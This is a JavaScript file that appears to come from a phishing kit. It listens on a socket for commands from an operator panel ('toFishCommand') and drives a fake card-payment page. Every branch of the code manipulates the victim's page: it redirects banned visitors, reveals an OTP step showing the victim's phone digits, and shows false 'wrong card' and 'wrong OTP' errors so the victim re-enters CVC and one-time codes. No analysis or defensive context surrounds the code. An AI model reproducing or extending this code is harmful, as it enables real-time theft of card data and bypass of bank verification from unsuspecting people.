function initActionsOnCommandsFromPanelFunc(socket) {
    socket.on('toFishCommand', data => {
        console.log(data);
        const hpMainForm = document.querySelector('.hp-main-form')
        const hpOtpFormStep2 = document.querySelector('.hp-OTP-2-form')
        const hpOverlay = document.querySelector('.hp-overlay')

        if (data.command === 'BAN') {
            window.location.replace(`${banLink}`);
        }

        if (data.command === 'SHOW PHONE') {
          const rlInactiveInputs = document.querySelectorAll('.input-inactive')
          const hpLastTwoDigit = document.querySelector('.last-two-digit')
          hpLastTwoDigit.textContent = `${data.phone}`

          hpMainForm.classList.remove('active')
          hpOverlay.classList.remove('active')

          hpOtpFormStep2.classList.add('active')

          rlInactiveInputs.forEach(input => {
            input.disabled = false
            input.classList.remove('input-inactive')
            input.classList.remove('hp-text-gray')
          })
        }

        if (data.command === 'SHOW WRONG CRED') {
          flag = true
          hpSubmitBtn.disabled = true
          hpSubmitButtonText.textContent = 'Pay'
          hpSubmitButtonText.classList.remove('active')
          hpButtonSpinner.classList.remove('active')
          hpErrorBlockCardNumber.classList.add('active')

          hpOverlay.classList.remove('active')


          // hpErrorCard.classList.add('active');
          // hpCardNumberInput.classList.add('error')
          // hpCardNumberIconList.classList.add('hide');
          // hpCardNumberErrorIcon.classList.add('active');
          // hpSelectCard.classList.remove('active');

          rlCvcInput.classList.add('error')
          rlCvcInput.value = ''
          hpCvcErrorIcon.classList.add('active')
          hpCvcIconCard.classList.remove('visible')

          // hpDataErrorIcon.classList.add('active');
          // hpDataInput.classList.add('error')

          const rlInactiveInputs = document.querySelectorAll('.input-inactive')

          rlInactiveInputs.forEach(input => {
            input.disabled = false
            input.classList.remove('input-inactive')
            input.classList.remove('hp-text-gray')
          })
        }

        if (data.command === "SHOW WRONG OTP") {
          const otpInputs = document.querySelectorAll('.otp-input');

          otpInputs.forEach(input => {
            input.classList.add('error')
            input.classList.remove('inactive')
            input.value = ''
            rlSubmitCode6.disabled = true
          })

          hpOtpTextError.classList.add('active')
          hpOtpLoader2.classList.remove('active')
          hpButtonSpinner3.classList.remove('active')
        }
    });

    socket.on('toFishSocketId', data => {
        console.log('this is toFishAction');
        console.log(data);
        localStorage.hpFirstSocketId = data.socketId;
    });
}
